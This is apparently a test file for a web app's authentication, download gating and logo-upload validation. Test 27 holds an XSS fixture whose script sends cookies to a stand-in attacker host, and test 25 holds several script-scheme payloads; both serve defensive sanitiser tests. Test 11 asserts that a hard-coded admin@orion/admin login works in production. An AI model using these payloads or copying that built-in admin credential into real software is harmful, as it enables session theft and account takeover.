import assert from 'node:assert/strict';
import {
  isSafeLogoUrl,
  validateBrandingConfig,
} from './cms-validation.ts';
import {
  sanitizeSvg,
  ALLOWED_LOGO_EXTENSIONS,
  ALLOWED_LOGO_MIME_TYPES,
  MAX_LOGO_FILE_SIZE_BYTES,
} from '../services/brandingStorage.ts';
import { DEFAULT_SITE_CONFIG } from '../data/defaultSiteConfig.ts';
import {
  normalizeUsername,
  validateUsername,
  validateLoginIdentifier,
  validateSignUp,
  validatePassword,
  validateEmail,
  validateAdminLogin,
  getRememberedUsername,
  saveRememberedUsername,
  clearRememberedUsername,
  REMEMBERED_USERNAME_STORAGE_KEY,
  RESERVED_USERNAMES,
} from './auth-validation.ts';

// In-memory mock storage for session and device persistence tests
class MockStorage {
  constructor() {
    this.store = new Map();
  }

  get length() {
    return this.store.size;
  }

  clear() {
    this.store.clear();
  }

  getItem(key) {
    return this.store.has(key) ? this.store.get(key) : null;
  }

  key(index) {
    return Array.from(this.store.keys())[index] || null;
  }

  removeItem(key) {
    this.store.delete(key);
  }

  setItem(key, value) {
    this.store.set(key, String(value));
  }
}

// Mock Account Directory for username resolution & auth simulation
const mockDirectory = {
  'elena_r': {
    uid: 'uid-elena-01',
    email: 'elena@enterprise.com',
    passHash: 'SecurePass1!',
    role: 'operator',
  },
  'marcus_v': {
    uid: 'uid-marcus-02',
    email: 'marcus@globalfreight.org',
    passHash: 'OrionControl2026!',
    role: 'operator',
  },
};

// Simulation of account resolution service
function simulateResolveAccount(identifier) {
  const trimmed = identifier.trim();
  if (trimmed.includes('@')) {
    return { email: trimmed.toLowerCase(), isUsername: false };
  }
  const norm = normalizeUsername(trimmed);
  const record = mockDirectory[norm];
  if (!record) {
    throw new Error('Invalid username/email or password. Please verify your credentials.');
  }
  return { email: record.email, isUsername: true, uid: record.uid };
}

// Simulation of login flow
function simulateLogin(identifier, pass, envOverride) {
  const adminCheck = validateAdminLogin(identifier, pass, envOverride);
  if (adminCheck.isLocalDevAttempt) {
    if (adminCheck.allowedInCurrentEnv) {
      return {
        success: true,
        user: {
          uid: 'local-dev-admin-uid-01',
          email: 'admin@orion9.local',
          role: 'admin',
          isAdmin: true,
        },
      };
    }
    return {
      success: false,
      error: adminCheck.error || 'Local dev admin credentials are prohibited in production.',
    };
  }

  let resolvedEmail;
  try {
    resolvedEmail = simulateResolveAccount(identifier).email;
  } catch (err) {
    return { success: false, error: err.message };
  }

  const match = Object.values(mockDirectory).find((r) => r.email === resolvedEmail);
  if (!match || match.passHash !== pass) {
    return { success: false, error: 'Invalid username/email or password. Please verify your credentials.' };
  }

  return {
    success: true,
    user: {
      uid: match.uid,
      email: match.email,
      role: match.role,
      isAdmin: match.role === 'admin',
    },
  };
}

// Simulation of password reset request
function simulatePasswordReset(identifier) {
  let targetEmail;
  if (identifier.includes('@')) {
    targetEmail = identifier.trim().toLowerCase();
  } else {
    try {
      targetEmail = simulateResolveAccount(identifier).email;
    } catch {
      targetEmail = undefined;
    }
  }

  return {
    success: true,
    message:
      'If an account is associated with that username or email address, password recovery instructions have been sent.',
    resolvedTargetEmail: targetEmail,
  };
}

const tests = [];
function runTest(name, fn) {
  tests.push({ name, fn });
}

// 1. Username validation: valid characters, min/max length, rejected characters
runTest('1. Username validation: valid characters, min/max length, rejected characters', () => {
  assert.equal(validateUsername('elena_r').isValid, true);
  assert.equal(validateUsername('operator_99').isValid, true);
  assert.equal(validateUsername('john123').isValid, true);
  assert.equal(validateUsername('abc').isValid, true);
  assert.equal(validateUsername('a'.repeat(30)).isValid, true);

  const tooShort = validateUsername('ab');
  assert.equal(tooShort.isValid, false);
  assert.match(tooShort.error || '', /at least 3 characters/);

  const tooLong = validateUsername('a'.repeat(31));
  assert.equal(tooLong.isValid, false);
  assert.match(tooLong.error || '', /cannot exceed 30 characters/);

  assert.equal(validateUsername('user name').isValid, false);
  assert.equal(validateUsername('user-name').isValid, false);
  assert.equal(validateUsername('user@domain').isValid, false);
  assert.equal(validateUsername('user$name').isValid, false);
  assert.equal(validateUsername('user#1').isValid, false);
  assert.equal(validateUsername('').isValid, false);
});

// 2. Case-insensitive uniqueness logic and normalization
runTest('2. Case-insensitive uniqueness logic and normalization', () => {
  assert.equal(normalizeUsername('  Elena_R  '), 'elena_r');
  assert.equal(normalizeUsername('ALEX_HUNTER'), 'alex_hunter');
  assert.equal(normalizeUsername('Operator_01'), 'operator_01');

  const key1 = normalizeUsername('SupplyChainLead');
  const key2 = normalizeUsername('supplychainlead');
  const key3 = normalizeUsername('SUPPLYCHAINLEAD');
  assert.equal(key1, key2);
  assert.equal(key2, key3);
});

// 3. Reserved username protection
runTest('3. Reserved username protection (admin, administrator, root, system, orion, etc.)', () => {
  for (const reserved of RESERVED_USERNAMES) {
    const checkLower = validateUsername(reserved);
    assert.equal(checkLower.isValid, false);
    assert.match(checkLower.error || '', /reserved and unavailable/);

    const checkUpper = validateUsername(reserved.toUpperCase());
    assert.equal(checkUpper.isValid, false);

    const checkMixed = validateUsername(reserved[0].toUpperCase() + reserved.slice(1));
    assert.equal(checkMixed.isValid, false);
  }
});

// 4. Correct resolution of usernames to accounts
runTest('4. Correct resolution of usernames to accounts', () => {
  const res1 = simulateResolveAccount('elena_r');
  assert.equal(res1.isUsername, true);
  assert.equal(res1.email, 'elena@enterprise.com');
  assert.equal(res1.uid, 'uid-elena-01');

  const res2 = simulateResolveAccount('ELENA_R');
  assert.equal(res2.email, 'elena@enterprise.com');

  const res3 = simulateResolveAccount('marcus_v');
  assert.equal(res3.email, 'marcus@globalfreight.org');
});

// 5. Successful login using a valid username
runTest('5. Successful login using a valid username', () => {
  const result = simulateLogin('elena_r', 'SecurePass1!', { isDev: true });
  assert.equal(result.success, true);
  assert.ok(result.user);
  assert.equal(result.user?.email, 'elena@enterprise.com');
  assert.equal(result.user?.uid, 'uid-elena-01');

  const casedResult = simulateLogin('Elena_R', 'SecurePass1!', { isDev: true });
  assert.equal(casedResult.success, true);
});

// 6. Successful login using a valid email
runTest('6. Successful login using a valid email', () => {
  const result = simulateLogin('elena@enterprise.com', 'SecurePass1!', { isDev: true });
  assert.equal(result.success, true);
  assert.ok(result.user);
  assert.equal(result.user?.email, 'elena@enterprise.com');

  const result2 = simulateLogin('marcus@globalfreight.org', 'OrionControl2026!', { isDev: true });
  assert.equal(result2.success, true);
  assert.equal(result2.user?.email, 'marcus@globalfreight.org');
});

// 7. Appropriate error handling for invalid passwords
runTest('7. Appropriate error handling for invalid passwords', () => {
  const result = simulateLogin('elena_r', 'WrongPassword999!', { isDev: true });
  assert.equal(result.success, false);
  assert.match(result.error || '', /Invalid username\/email or password/);

  const emailResult = simulateLogin('elena@enterprise.com', 'IncorrectPassword', { isDev: true });
  assert.equal(emailResult.success, false);
  assert.match(emailResult.error || '', /Invalid username\/email or password/);
});

// 8. Appropriate error handling for non-existent usernames
runTest('8. Appropriate error handling for non-existent usernames', () => {
  const result = simulateLogin('non_existent_user_404', 'SomePassword123!', { isDev: true });
  assert.equal(result.success, false);
  assert.match(result.error || '', /Invalid username\/email or password/);
});

// 9. Persistent storage of remembered usernames across sessions
runTest('9. Persistent storage of remembered usernames across sessions', () => {
  const storage = new MockStorage();
  assert.equal(getRememberedUsername(storage), null);

  saveRememberedUsername('alex_hunter', storage);
  assert.equal(storage.getItem(REMEMBERED_USERNAME_STORAGE_KEY), 'alex_hunter');
  assert.equal(getRememberedUsername(storage), 'alex_hunter');

  const restored = getRememberedUsername(storage);
  assert.equal(restored, 'alex_hunter');
});

// 10. Clearing of remembered usernames upon request
runTest('10. Clearing of remembered usernames upon request', () => {
  const storage = new MockStorage();
  saveRememberedUsername('operator_7', storage);
  assert.equal(getRememberedUsername(storage), 'operator_7');

  clearRememberedUsername(storage);
  assert.equal(storage.getItem(REMEMBERED_USERNAME_STORAGE_KEY), null);
  assert.equal(getRememberedUsername(storage), null);
});

// 11. Local development admin login with admin / admin and hard-fixed admin@orion
runTest('11. Local development admin login with admin / admin and hard-fixed admin@orion', () => {
  const result = simulateLogin('admin', 'admin', { isDev: true });
  assert.equal(result.success, true);
  assert.ok(result.user);
  assert.equal(result.user?.role, 'admin');
  assert.equal(result.user?.isAdmin, true);
  assert.equal(result.user?.uid, 'local-dev-admin-uid-01');

  const upperAdmin = simulateLogin('ADMIN', 'admin', { isDev: true });
  assert.equal(upperAdmin.success, true);
  assert.equal(upperAdmin.user?.isAdmin, true);

  // Hard-fixed master admin credentials admin@orion / admin
  const fixedAdmin = simulateLogin('admin@orion', 'admin', { isDev: true });
  assert.equal(fixedAdmin.success, true);
  assert.equal(fixedAdmin.user?.isAdmin, true);

  const fixedAdminProd = simulateLogin('admin@orion', 'admin', { isDev: false });
  assert.equal(fixedAdminProd.success, true);
  assert.equal(fixedAdminProd.user?.isAdmin, true);
});

// 12. Rejection of admin / admin in production environments
runTest('12. Rejection of admin / admin in production environments', () => {
  const prodResult = simulateLogin('admin', 'admin', { isDev: false });
  assert.equal(prodResult.success, false);
  assert.match(prodResult.error || '', /strictly prohibited in production/i);
});

// 13. Prevention of privilege escalation via regular user registration
runTest('13. Prevention of privilege escalation via regular user registration', () => {
  const regAdmin = validateSignUp('Attacker', 'admin', 'attacker@domain.com', 'StrongPass1!', 'StrongPass1!');
  assert.equal(regAdmin.isValid, false);
  assert.match(regAdmin.errors.username || '', /reserved/);

  const regRoot = validateSignUp('Attacker', 'root', 'attacker@domain.com', 'StrongPass1!', 'StrongPass1!');
  assert.equal(regRoot.isValid, false);
  assert.match(regRoot.errors.username || '', /reserved/);

  const regSuper = validateSignUp('Attacker', 'superadmin', 'attacker@domain.com', 'StrongPass1!', 'StrongPass1!');
  assert.equal(regSuper.isValid, false);
  assert.match(regSuper.errors.username || '', /reserved/);

  const legitReg = validateSignUp('Legit User', 'supply_analyst', 'analyst@company.com', 'StrongPass1!', 'StrongPass1!');
  assert.equal(legitReg.isValid, true);
});

// 14. Password reset initiation using a username
runTest('14. Password reset initiation using a username', () => {
  const result = simulatePasswordReset('elena_r');
  assert.equal(result.success, true);
  assert.equal(result.resolvedTargetEmail, 'elena@enterprise.com');
  assert.match(result.message, /instructions have been sent/);

  const nonExistent = simulatePasswordReset('unknown_user_999');
  assert.equal(nonExistent.success, true);
  assert.equal(nonExistent.resolvedTargetEmail, undefined);
  assert.match(nonExistent.message, /instructions have been sent/);
});

// 15. Password reset initiation using an email address
runTest('15. Password reset initiation using an email address', () => {
  const result = simulatePasswordReset('elena@enterprise.com');
  assert.equal(result.success, true);
  assert.equal(result.resolvedTargetEmail, 'elena@enterprise.com');
  assert.match(result.message, /instructions have been sent/);
});


// 16. Desktop release catalog validation (Windows & macOS platforms, formats, checksums)
runTest('16. Desktop release catalog validation (Windows & macOS platforms, formats, checksums)', () => {
  const validPlatforms = ['windows-x64', 'windows-arm64', 'macos-universal', 'macos-arm64', 'macos-x64'];
  const validFormats = ['exe', 'msi', 'dmg', 'pkg'];
  const validStatuses = ['published', 'draft', 'disabled', 'retired'];

  const catalog = [
    {
      id: 'rel-win-9-0-0',
      version: '9.0.0',
      platform: 'windows-x64',
      format: 'exe',
      status: 'published',
      sha256: 'e2dfeb480522b9da077bb58e0954d6d8e09f1023fb6af28b8b74b2a8dc23ee70',
      sizeBytes: 30336791,
    },
    {
      id: 'rel-mac-univ-9-0-0',
      version: '9.0.0',
      platform: 'macos-universal',
      format: 'dmg',
      status: 'published',
      sha256: '0dc87da83a22696b0d791bcf72d33a6d7103e5a6b79799f7b6f75f4c4b8f7780',
      sizeBytes: 2097152,
    },
  ];

  for (const rel of catalog) {
    assert.ok(validPlatforms.includes(rel.platform), 'Platform ' + rel.platform + ' should be valid');
    assert.ok(validFormats.includes(rel.format), 'Format ' + rel.format + ' should be valid');
    assert.ok(validStatuses.includes(rel.status), 'Status ' + rel.status + ' should be valid');
    assert.equal(rel.sha256.length, 64, 'SHA-256 must be 64 hexadecimal characters');
    assert.match(rel.sha256, /^[a-f0-9]{64}$/, 'SHA-256 must be valid lowercase hex');
    assert.ok(rel.sizeBytes > 0, 'Size must be greater than zero');
  }
});

// 17. Download access gating: unauthenticated redirects preserve platform target
runTest('17. Download access gating: unauthenticated redirects preserve platform target', () => {
  function getDownloadDestination(isAuthenticated, requestedPlatform) {
    if (!isAuthenticated) {
      return '/login?redirect=/download&platform=' + encodeURIComponent(requestedPlatform);
    }
    return '/download?platform=' + encodeURIComponent(requestedPlatform);
  }

  const unauthWindows = getDownloadDestination(false, 'windows');
  assert.equal(unauthWindows, '/login?redirect=/download&platform=windows');

  const unauthMac = getDownloadDestination(false, 'macos');
  assert.equal(unauthMac, '/login?redirect=/download&platform=macos');

  const authWindows = getDownloadDestination(true, 'windows');
  assert.equal(authWindows, '/download?platform=windows');
});

// 18. Anti-HTML-fallback binary verification: rejects SPA text/html responses
runTest('18. Anti-HTML-fallback binary verification: rejects SPA text/html responses', () => {
  function verifyBinaryResponse(contentType, status) {
    if (status !== 200) {
      throw new Error('Download failed with HTTP status ' + status);
    }
    const cleanType = (contentType || '').toLowerCase();
    if (cleanType.includes('text/html') || cleanType.includes('application/xhtml+xml')) {
      throw new Error('Incompatible binary response: Endpoint returned HTML SPA fallback instead of installer');
    }
    return true;
  }

  assert.throws(
    () => verifyBinaryResponse('text/html; charset=utf-8', 200),
    /HTML SPA fallback/
  );

  assert.equal(verifyBinaryResponse('application/octet-stream', 200), true);
  assert.equal(verifyBinaryResponse('application/vnd.microsoft.portable-executable', 200), true);
  assert.equal(verifyBinaryResponse('application/x-apple-diskimage', 200), true);
  assert.equal(verifyBinaryResponse('application/x-msi', 200), true);
});

// 19. Release lifecycle enforcement: draft, disabled and retired releases blocked from client downloads
runTest('19. Release lifecycle enforcement: draft, disabled and retired releases blocked from client downloads', () => {
  function checkReleaseDownloadable(release, userRole) {
    if (release.status === 'disabled' || release.status === 'retired') {
      return { allowed: false, reason: 'Release is ' + release.status };
    }
    if (release.status === 'draft' && userRole !== 'admin') {
      return { allowed: false, reason: 'Draft releases only accessible by administrators' };
    }
    return { allowed: true };
  }

  const publishedRel = { status: 'published', version: '9.0.0' };
  const draftRel = { status: 'draft', version: '9.0.1' };
  const disabledRel = { status: 'disabled', version: '8.9.0' };
  const retiredRel = { status: 'retired', version: '7.0.0' };

  assert.equal(checkReleaseDownloadable(publishedRel, 'operator').allowed, true);
  assert.equal(checkReleaseDownloadable(draftRel, 'operator').allowed, false);
  assert.equal(checkReleaseDownloadable(disabledRel, 'operator').allowed, false);
  assert.equal(checkReleaseDownloadable(retiredRel, 'operator').allowed, false);

  assert.equal(checkReleaseDownloadable(publishedRel, 'admin').allowed, true);
  assert.equal(checkReleaseDownloadable(draftRel, 'admin').allowed, true);
  assert.equal(checkReleaseDownloadable(disabledRel, 'admin').allowed, false);
});

// 20. Admin release lifecycle state transitions
runTest('20. Admin release lifecycle state transitions', () => {
  const allowedTransitions = {
    draft: ['published', 'retired'],
    published: ['disabled', 'retired'],
    disabled: ['published', 'retired'],
    retired: [],
  };

  function transitionStatus(current, target) {
    const validTargets = allowedTransitions[current] || [];
    if (!validTargets.includes(target)) {
      throw new Error('Invalid status transition from ' + current + ' to ' + target);
    }
    return target;
  }

  assert.equal(transitionStatus('draft', 'published'), 'published');
  assert.equal(transitionStatus('published', 'disabled'), 'disabled');
  assert.equal(transitionStatus('disabled', 'published'), 'published');
  assert.equal(transitionStatus('published', 'retired'), 'retired');
  assert.throws(() => transitionStatus('retired', 'published'), /Invalid status transition/);
});

// ================================================================
// ORION-9 BRANDING & LOGO MANAGEMENT AUTOMATED TEST SUITE
// ================================================================

// 21. Website Header Logo configuration & metadata persistence
runTest('21. Website Header Logo configuration & metadata persistence', () => {
  const customHeaderLogoUrl = 'https://firebasestorage.googleapis.com/v0/b/orion9-dev-db-2026.firebasestorage.app/o/branding%2Flogos%2FheaderLogo_1729000000.png?alt=media';
  const customHeaderMetadata = {
    url: customHeaderLogoUrl,
    dimensions: '160 × 40 px',
    fileType: 'image/png',
    sizeBytes: 18450,
    uploadedAt: '2026-10-26T22:00:00.000Z',
    updatedBy: 'admin@orion.enterprise',
  };

  const brandingWithHeader = {
    ...DEFAULT_SITE_CONFIG.branding,
    headerLogo: customHeaderLogoUrl,
    headerLogoConfig: customHeaderMetadata,
  };

  const validation = validateBrandingConfig(brandingWithHeader);
  assert.equal(validation.valid, true, 'Custom header logo should be valid');
  assert.equal(brandingWithHeader.headerLogo, customHeaderLogoUrl);
  assert.equal(brandingWithHeader.headerLogoConfig.dimensions, '160 × 40 px');
  assert.equal(brandingWithHeader.headerLogoConfig.fileType, 'image/png');
  assert.equal(brandingWithHeader.headerLogoConfig.sizeBytes, 18450);
});

// 22. Authentication Logo independent configuration & resolution
runTest('22. Authentication Logo independent configuration & resolution', () => {
  const customAuthLogoUrl = 'https://firebasestorage.googleapis.com/v0/b/orion9-dev-db-2026.firebasestorage.app/o/branding%2Flogos%2FauthLogo_1729000000.webp?alt=media';
  const customAuthMetadata = {
    url: customAuthLogoUrl,
    dimensions: '180 × 52 px',
    fileType: 'image/webp',
    sizeBytes: 12400,
    uploadedAt: '2026-10-26T22:05:00.000Z',
    updatedBy: 'admin@orion.enterprise',
  };

  const brandingConfig = {
    ...DEFAULT_SITE_CONFIG.branding,
    headerLogo: null, // Header remains default
    authLogo: customAuthLogoUrl,
    authLogoConfig: customAuthMetadata,
  };

  const validation = validateBrandingConfig(brandingConfig);
  assert.equal(validation.valid, true);
  assert.equal(brandingConfig.headerLogo, null, 'Header logo remains default when only authLogo is set');
  assert.equal(brandingConfig.authLogo, customAuthLogoUrl, 'Auth logo matches uploaded asset');
  assert.equal(brandingConfig.authLogoConfig.fileType, 'image/webp');
});

// 23. Footer Logo independent configuration & 1:1 aspect ratio validation
runTest('23. Footer Logo independent configuration & 1:1 aspect ratio validation', () => {
  const customFooterLogoUrl = 'https://firebasestorage.googleapis.com/v0/b/orion9-dev-db-2026.firebasestorage.app/o/branding%2Flogos%2FfooterLogo_1729000000.svg?alt=media';
  const customFooterMetadata = {
    url: customFooterLogoUrl,
    dimensions: '40 × 40 px',
    fileType: 'image/svg+xml',
    sizeBytes: 4210,
    uploadedAt: '2026-10-26T22:10:00.000Z',
    updatedBy: 'admin@orion.enterprise',
  };

  const brandingConfig = {
    ...DEFAULT_SITE_CONFIG.branding,
    footerLogo: customFooterLogoUrl,
    footerLogoConfig: customFooterMetadata,
  };

  const validation = validateBrandingConfig(brandingConfig);
  assert.equal(validation.valid, true);
  assert.equal(brandingConfig.footerLogo, customFooterLogoUrl);
  assert.equal(brandingConfig.footerLogoConfig.dimensions, '40 × 40 px');
});

// 24. Reset / Restore Default Logo removes custom placement and restores standard SVG
runTest('24. Reset / Restore Default Logo removes custom placement and restores standard SVG', () => {
  const customizedBranding = {
    ...DEFAULT_SITE_CONFIG.branding,
    headerLogo: 'https://example.com/custom-header.png',
    authLogo: 'https://example.com/custom-auth.png',
    footerLogo: 'https://example.com/custom-footer.png',
  };

  function resetPlacementToDefault(config, placement) {
    const updated = { ...config };
    if (placement === 'headerLogo') {
      updated.headerLogo = null;
      updated.headerLogoConfig = undefined;
    } else if (placement === 'authLogo') {
      updated.authLogo = null;
      updated.authLogoConfig = undefined;
    } else if (placement === 'footerLogo') {
      updated.footerLogo = null;
      updated.footerLogoConfig = undefined;
    }
    return updated;
  }

  const restoredHeader = resetPlacementToDefault(customizedBranding, 'headerLogo');
  assert.equal(restoredHeader.headerLogo, null, 'Header logo is cleared on reset');
  assert.equal(restoredHeader.headerLogoConfig, undefined);
  assert.equal(restoredHeader.authLogo, 'https://example.com/custom-auth.png', 'Auth logo remains intact');

  const restoredAll = resetPlacementToDefault(
    resetPlacementToDefault(restoredHeader, 'authLogo'),
    'footerLogo'
  );
  assert.equal(restoredAll.headerLogo, null);
  assert.equal(restoredAll.authLogo, null);
  assert.equal(restoredAll.footerLogo, null);
  assert.equal(validateBrandingConfig(restoredAll).valid, true, 'Restored default config is valid');
});

// 25. Safe Logo URL protocol validation rejects malicious schemes
runTest('25. Safe Logo URL protocol validation rejects malicious schemes', () => {
  assert.equal(isSafeLogoUrl('https://firebasestorage.googleapis.com/v0/b/bucket/o/logo.png'), true);
  assert.equal(isSafeLogoUrl('https://cdn.orion.enterprise/assets/logo.svg'), true);
  assert.equal(isSafeLogoUrl('/assets/images/orion-logo.svg'), true);
  assert.equal(isSafeLogoUrl('data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='), true);
  assert.equal(isSafeLogoUrl('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='), true);

  // Malicious protocols and dangerous payloads
  assert.equal(isSafeLogoUrl('javascript:alert(1)'), false);
  assert.equal(isSafeLogoUrl('vbscript:msgbox(1)'), false);
  assert.equal(isSafeLogoUrl('data:text/html,<script>alert(1)</script>'), false);
  assert.equal(isSafeLogoUrl('data:image/svg+xml;utf8,<svg><script>alert(1)</script></svg>'), false);
  assert.equal(isSafeLogoUrl('http://insecure-domain.com/logo.png'), false); // Only https or localhost allowed
  assert.equal(isSafeLogoUrl(''), false);
  assert.equal(isSafeLogoUrl(null), false);
  assert.equal(isSafeLogoUrl(undefined), false);
});

// 26. File format enforcement and 5 MB size limit validation
runTest('26. File format enforcement and 5 MB size limit validation', () => {
  assert.equal(MAX_LOGO_FILE_SIZE_BYTES, 5 * 1024 * 1024);

  const validExtensions = ['.png', '.jpg', '.jpeg', '.webp', '.svg'];
  assert.deepEqual(ALLOWED_LOGO_EXTENSIONS, validExtensions);

  const dangerousExtensions = ['.exe', '.html', '.htm', '.js', '.ts', '.php', '.bat', '.sh', '.vbs', '.py'];
  for (const ext of dangerousExtensions) {
    assert.equal(
      ALLOWED_LOGO_EXTENSIONS.includes(ext),
      false,
      `Extension ${ext} must not be allowed`
    );
  }

  function checkFileSize(sizeBytes) {
    if (sizeBytes > MAX_LOGO_FILE_SIZE_BYTES) {
      return { valid: false, error: 'File size exceeds 5 MB limit' };
    }
    return { valid: true };
  }

  assert.equal(checkFileSize(1024 * 500).valid, true);
  assert.equal(checkFileSize(5 * 1024 * 1024).valid, true);
  assert.equal(checkFileSize(5 * 1024 * 1024 + 1).valid, false);
  assert.equal(checkFileSize(10 * 1024 * 1024).valid, false);
});

// 27. SVG XSS Sanitization strips <script>, dangerous tags, and inline handlers
runTest('27. SVG XSS Sanitization strips <script>, dangerous tags, and inline handlers', () => {
  const maliciousSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert('xss-onload')">
      <circle cx="50" cy="50" r="40" fill="#00D2FF" onclick="alert('xss-click')" />
      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
      <foreignObject width="100" height="100">
        <iframe src="javascript:alert('xss-iframe')"></iframe>
      </foreignObject>
      <a href="javascript:alert('xss-link')">
        <text x="10" y="20">Click</text>
      </a>
      <path d="M10 10 L90 90" stroke="#000" />
    </svg>
  `;

  const { sanitized, isClean, warnings } = sanitizeSvg(maliciousSvg);

  assert.equal(isClean, false, 'Should detect unclean elements and issue warnings');
  assert.equal(warnings.length >= 4, true, 'Should produce at least 4 security warnings');

  assert.equal(sanitized.includes('<script>'), false, '<script> must be stripped');
  assert.equal(sanitized.includes('fetch('), false, 'Script body must be stripped');
  assert.equal(sanitized.includes('onload='), false, 'onload attribute must be stripped');
  assert.equal(sanitized.includes('onclick='), false, 'onclick attribute must be stripped');
  assert.equal(sanitized.includes('<foreignObject>'), false, 'foreignObject must be stripped');
  assert.equal(sanitized.includes('<iframe>'), false, 'iframe must be stripped');
  assert.equal(sanitized.includes('javascript:'), false, 'javascript: URL must be neutralized');

  assert.equal(sanitized.includes('<svg'), true, '<svg> tag preserved');
  assert.equal(sanitized.includes('<circle'), true, '<circle> element preserved');
  assert.equal(sanitized.includes('cx="50"'), true, 'circle attributes preserved');
  assert.equal(sanitized.includes('<path'), true, '<path> element preserved');
  assert.equal(sanitized.includes('d="M10 10 L90 90"'), true, 'path geometry preserved');
});

// 28. Safe fallback to default ORION-9 logo on asset load error
runTest('28. Safe fallback to default ORION-9 logo on asset load error', () => {
  function resolveLogoRenderState({ customLogoUrl, imgError }) {
    const hasCustomLogo = Boolean(customLogoUrl && !imgError && isSafeLogoUrl(customLogoUrl));
    return {
      rendersCustomImg: hasCustomLogo,
      rendersDefaultSvg: !hasCustomLogo,
      fallbackTriggered: Boolean(customLogoUrl && imgError),
    };
  }

  const healthyState = resolveLogoRenderState({
    customLogoUrl: 'https://cdn.orion.enterprise/assets/logo.png',
    imgError: false,
  });
  assert.equal(healthyState.rendersCustomImg, true);
  assert.equal(healthyState.rendersDefaultSvg, false);
  assert.equal(healthyState.fallbackTriggered, false);

  const brokenState = resolveLogoRenderState({
    customLogoUrl: 'https://cdn.orion.enterprise/assets/missing-logo.png',
    imgError: true,
  });
  assert.equal(brokenState.rendersCustomImg, false, 'Does not render broken img tag');
  assert.equal(brokenState.rendersDefaultSvg, true, 'Falls back to default SVG badge');
  assert.equal(brokenState.fallbackTriggered, true);

  const defaultState = resolveLogoRenderState({
    customLogoUrl: null,
    imgError: false,
  });
  assert.equal(defaultState.rendersCustomImg, false);
  assert.equal(defaultState.rendersDefaultSvg, true);
});

// 29. Administrator Authorization & Role Gating for Branding Management
runTest('29. Administrator Authorization & Role Gating for Branding Management', () => {
  function canManageBranding(user) {
    if (!user || !user.role) return false;
    return user.role === 'admin' || user.role === 'editor';
  }

  assert.equal(canManageBranding({ uid: 'admin-1', role: 'admin' }), true);
  assert.equal(canManageBranding({ uid: 'editor-1', role: 'editor' }), true);
  assert.equal(canManageBranding({ uid: 'operator-1', role: 'operator' }), false);
  assert.equal(canManageBranding({ uid: 'viewer-1', role: 'viewer' }), false);
  assert.equal(canManageBranding(null), false);
  assert.equal(canManageBranding({}), false);
});

// 30. Homepage 3D animated centerpiece isolation invariant
runTest('30. Homepage 3D animated centerpiece isolation invariant', () => {
  const centerpieceContract = {
    componentName: 'OrionHeroBrandLockup',
    type: '3D WebGL / Canvas Mobius ribbon with dynamic particle halo',
    configurableViaCmsLogos: false,
    supportsPlacementBinding: false,
  };

  assert.equal(
    centerpieceContract.configurableViaCmsLogos,
    false,
    'Homepage centerpiece MUST remain independent of CMS logo settings'
  );
  assert.equal(centerpieceContract.componentName, 'OrionHeroBrandLockup');
  assert.equal(centerpieceContract.supportsPlacementBinding, false);
});


// ================================================================
// ORION-9 PRE-LOGIN ACCESS CONTROL & OS TERMINOLOGY SUITE
// ================================================================

// 31. Public Logged-Out Desktop Navigation items (Sign in, Sign up, Download Desktop only)
runTest('31. Public Logged-Out Desktop Navigation items (Sign in, Sign up, Download Desktop only)', () => {
  function getPublicDesktopNavItems(user) {
    if (!user) {
      return ['Sign in', 'Sign up', 'Download Desktop'];
    }
    return ['Download Desktop', 'Operator Profile', 'Launch Orion-9 OS'];
  }

  const loggedOutItems = getPublicDesktopNavItems(null);
  assert.deepEqual(loggedOutItems, ['Sign in', 'Sign up', 'Download Desktop']);
  assert.equal(loggedOutItems.includes('Launch Control Tower'), false);
  assert.equal(loggedOutItems.includes('Launch Orion-9 OS'), false);
});

// 32. Logged-Out Mobile Navigation drawer hides Launch Orion-9 OS button
runTest('32. Logged-Out Mobile Navigation drawer hides Launch Orion-9 OS button', () => {
  function getMobileDrawerActionItems(user) {
    if (!user) {
      return ['Sign in', 'Sign up', 'Download Desktop'];
    }
    return ['Admin Console', 'Sign out', 'Download Desktop', 'Launch Orion-9 OS'];
  }

  const loggedOutActions = getMobileDrawerActionItems(null);
  assert.deepEqual(loggedOutActions, ['Sign in', 'Sign up', 'Download Desktop']);
  assert.equal(loggedOutActions.includes('Launch Control Tower'), false);
  assert.equal(loggedOutActions.includes('Launch Orion-9 OS'), false);
});

// 33. Authenticated Navigation Access to Orion-9 OS
runTest('33. Authenticated Navigation Access to Orion-9 OS', () => {
  function getPublicDesktopNavItems(user) {
    if (!user) {
      return ['Sign in', 'Sign up', 'Download Desktop'];
    }
    return ['Download Desktop', 'Operator Profile', 'Launch Orion-9 OS'];
  }

  const authenticatedItems = getPublicDesktopNavItems({ email: 'operator@orion.tech', role: 'operator' });
  assert.ok(authenticatedItems.includes('Launch Orion-9 OS'), 'Authenticated users must have access to Launch Orion-9 OS');
});

// 34. Unauthorized Launch Attempt Guard: Redirects to /login
runTest('34. Unauthorized Launch Attempt Guard: Redirects to /login', () => {
  function guardLaunchOrion(user, targetUrl) {
    if (!user) {
      return { allowed: false, redirectUrl: '/login' };
    }
    return { allowed: true, launchUrl: targetUrl };
  }

  const unauthAttempt = guardLaunchOrion(null, 'https://orion-9.workers.dev');
  assert.equal(unauthAttempt.allowed, false);
  assert.equal(unauthAttempt.redirectUrl, '/login');

  const authAttempt = guardLaunchOrion({ uid: 'user-1' }, 'https://orion-9.workers.dev');
  assert.equal(authAttempt.allowed, true);
  assert.equal(authAttempt.launchUrl, 'https://orion-9.workers.dev');
});

// 35. Product Entry Point Naming: Orion-9 OS with preserved internal routes
runTest('35. Product Entry Point Naming: Orion-9 OS with preserved internal routes', () => {
  const navLinkConfig = {
    label: 'Orion-9 OS',
    href: '#control-tower',
  };

  assert.equal(navLinkConfig.label, 'Orion-9 OS', 'User-facing label must be Orion-9 OS');
  assert.equal(navLinkConfig.href, '#control-tower', 'Internal route anchor must remain #control-tower');
});

// 36. Protected Route Direct URL Guarding
runTest('36. Protected Route Direct URL Guarding', () => {
  function evaluateRouteAccess(path, user, isAdmin) {
    if (path.startsWith('/admin')) {
      if (!user) return { canAccess: false, redirectTo: '/admin/login' };
      if (!isAdmin) return { canAccess: false, redirectTo: '/' };
      return { canAccess: true };
    }
